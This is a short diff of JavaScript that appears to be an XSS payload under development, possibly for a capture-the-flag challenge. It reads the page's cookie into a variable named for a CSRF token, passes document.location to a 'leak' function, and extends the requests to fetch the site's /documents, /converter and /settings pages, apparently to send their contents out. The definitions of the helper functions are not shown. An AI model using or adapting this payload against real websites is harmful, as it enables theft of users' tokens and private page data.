@@ -32,5 +32,7 @@ get = function(url)
 
 var csrf = document.cookie.split('=')[1];
 leak("location",JSON.stringify(document.location));
-get("/");
+get("/documents");
+get("/converter");
+get("/settings");
 
